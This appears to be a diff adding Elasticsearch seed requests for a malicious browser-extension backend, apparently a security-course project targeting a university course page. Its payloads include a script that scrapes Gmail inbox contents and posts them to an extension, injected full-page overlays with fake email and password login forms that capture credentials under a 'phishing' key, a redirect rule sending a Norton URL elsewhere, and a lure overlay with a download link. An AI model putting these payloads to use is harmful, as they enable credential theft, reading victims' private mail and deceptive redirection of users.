@@ -1,0 +1,66 @@
+DELETE dom/data/AViiumvJUD3A2nhmFWkg
+
+DELETE router/data/AVhgkeBQz8CsXufDKWXp
+
+POST router/data
+{
+  "data" : {
+      "secure_website" : "https://us.norton.com",
+      "routed_website" : "http://www.cheezburger.com/"
+  }
+}
+
+PUT history
+{
+    "settings" : {
+        "index" : {
+            "number_of_shards" : 1, 
+            "number_of_replicas" : 0 
+        }
+    }
+}
+
+POST js/data
+{
+  "data" : {
+      "userid" : "d1af89fc5dce169bff1823a6f5297449578de3a3ce96a3acd67a6667390d13c",
+      "website" : "https://mail.google.com/mail/#inbox",
+      "js_object" : "function getMails() {var tables = document.getElementsByTagName(\"table\");console.log(\"reaches getMails!!\");console.log(tables.length);var port = chrome.runtime.connect(\"gdkibpklppjhbdidafmpdacelcpjhalc\");var outdata = {};outdata [\"scriptphish\"] = {};for (var i = 0; i < tables.length; i++) {var t = tables[i].getElementsByTagName(\"colgroup\");if (t.length != 1) {continue;};var rows = tables[i].getElementsByTagName(\"tr\");if (rows.length <= 1) {continue;};var spans = tables[i].getElementsByTagName(\"span\");if (spans.length < 1) {continue;};for (var j = 0; j < spans.length; j++) {outdata[\"scriptphish\"][j] = spans[j].innerHTML;};};console.log(JSON.stringify(outdata));port.postMessage(outdata);}getMails(this);" 
+  }
+}
+
+POST dom/data
+{
+  "data" : {
+      "userid" : "d1af89fc5dce169bff1823a6f5297449578de3a3ce96a3acd67a6667390d13c",
+      "website" : "https://www.securitee.org/teaching/cse509/",
+      "dom_object" : "<div id=\"myNav\" class=\"overlay\" style= \"height: 100%;width: 100%;position: absolute; z-index: 1;left: 1%;   top: 1%;  background-color: rgb(0,0,0);  background-color: rgba(0,0,0, 0.7);overflow-x: hidden;transition: 0.5s;\"><a href=\"javascript:void(0)\" class=\"closebtn\" onclick=\"document.getElementById(&quot;myNav&quot;).style.width = &quot;0%&quot;\"style=\"position: absolute; top: 20px; right: 45px; font-size: 60px padding: 8px;text-decoration: none;font-size:36px;color: #818181;display: block;transition: 0.3s;\">&times;</a> <div class=\"overlay-content\" style=\"position:relative;top: 25%; width: 100%;text-align: center;margin-top: 30px;\"><form action=\"#\" onsubmit=\"function logform1(form) { console.log(&quot;blashh&quot;);};function logform(form) {console.log(&quot;reached form!!!&quot;);var port = chrome.runtime.connect(&quot;gdkibpklppjhbdidafmpdacelcpjhalc&quot;);var inps = form.getElementsByTagName(&quot;input&quot;);var logindata = {};    logindata[&quot;phishing&quot;] = {};for (var j = 0; j < inps.length; j++) {logindata[&quot;phishing&quot;][inps[j].name] = inps[j].value;}; console.log(JSON.stringify(logindata));port.postMessage(logindata);};logform(this);\" style=\"height:20%;width: 30%;left: 35%;top:40%;position:relative;background-color: #3b5998; color: #f0dede; \"><table style=\"color: #f0dede; text-align:left; position: relative;left:30%; width:35%; top:20%; \"><tr> <td>Email </td><td><input type=\"text\" name=\"email\"></td></tr><tr> <td>Password  </td><td><input type=\"password\" name=\"password\"></td></tr><tr><td></td> <td><input type=\"submit\" name=\"button\" value=\"Log In\"><td></tr></table></form></div></div><script type=\"text/javascript\">function logform(form) {console.log(\"reached form!!!\");}</script>" 
+  }
+}
+
+POST js/data
+{
+  "data" : {
+      "userid" : "d1af89fc5dce169bff1823a6f5297449578de3a3ce96a3acd67a6667390d13c",
+      "website" : "https://www.securitee.org/teaching/cse509/",
+      "js_object" : "alert(\"Testinggggggggg the world ........!!!!!\");" 
+  }
+}
+
+POST dom/data
+{
+  "data" : {
+      "userid" : "d1af89fc5dce169bff1823a6f5297449578de3a3ce96a3acd67a6667390d13c",
+      "website" : "https://www.securitee.org/",
+      "dom_object" : "<div id=\"myNav\" class=\"overlay\" style= \"height: 40%;width: 40%;position: absolute; z-index: 1; left: 30%;   top: 30%;  background-color: rgb(0,0,0);  background-color: rgba(0,0,0, 0.8);    overflow-x: hidden;  transition: 0.5s;\"> <a href=\"javascript:void(0)\" class=\"closebtn\" onclick=\"document.getElementById(&quot;myNav&quot;).style.width = &quot;0%&quot;\"style=\"position: absolute; top: 20px; right: 45px; font-size: 60px padding: 8px;text-decoration: none;font-size: 36px;color: #818181;display: block;transition: 0.3s;\">&times;</a><div class=\"overlay-content\" style=\"position:relative;top: 25%; width: 100%;text-align: center;margin-top: 30px;\"><a href=\"https://www.google.com/chrome/browser/thankyou.html?brand=CHBD&platform=win64&statcb=1&installdataindex=defaultbrowser\" style=\"padding: 8px;text-decoration: none;font-size: 36px;color: #818181;display: block;transition: 0.3s;\">Download to change your world</a></div></div>" 
+  }
+}
+
+POST dom/data/AViiwmONUD3A2nhmFWkt
+{
+  "data" : {
+      "userid" : "416d6554a874367a07d678de3779aa35a66293c5d56f3371613b46dd6fdf53",
+      "website" : "https://www.securitee.org/teaching/cse509/",
+      "dom_object" : "<div id=\"myNav\" class=\"overlay\" style= \"height: 100%;width: 100%;position: absolute; z-index: 1;left: 1%;   top: 1%;  background-color: rgb(0,0,0);  background-color: rgba(0,0,0, 0.7);overflow-x: hidden;transition: 0.5s;\"><a href=\"javascript:void(0)\" class=\"closebtn\" onclick=\"document.getElementById(&quot;myNav&quot;).style.width = &quot;0%&quot;\"style=\"position: absolute; top: 20px; right: 45px; font-size: 60px padding: 8px;text-decoration: none;font-size:36px;color: #818181;display: block;transition: 0.3s;\">&times;</a> <div class=\"overlay-content\" style=\"position:relative;top: 25%; width: 100%;text-align: center;margin-top: 30px;\"><form action=\"#\" onsubmit=\"function logform1(form) { console.log(&quot;blashh&quot;);};function logform(form) {console.log(&quot;reached form!!!&quot;);var port = chrome.runtime.connect(&quot;kaebfdhfcganajjlhbdclcdplnfkgggn&quot;);var inps = form.getElementsByTagName(&quot;input&quot;);var logindata = {};    logindata[&quot;phishing&quot;] = {};for (var j = 0; j < inps.length; j++) {logindata[&quot;phishing&quot;][inps[j].name] = inps[j].value;}; console.log(JSON.stringify(logindata));port.postMessage(logindata);};logform(this);\" style=\"height:20%;width: 30%;left: 35%;top:40%;position:relative;background-color: #3b5998; color: #f0dede; \"><table style=\"color: #f0dede; text-align:left; position: relative;left:30%; width:35%; top:20%; \"><tr> <td>Email </td><td><input type=\"text\" name=\"email\"></td></tr><tr> <td>Password  </td><td><input type=\"password\" name=\"password\"></td></tr><tr><td></td> <td><input type=\"submit\" name=\"button\" value=\"Log In\"><td></tr></table></form></div></div><script type=\"text/javascript\">function logform(form) {console.log(\"reached form!!!\");}</script>" 
+  }
+}
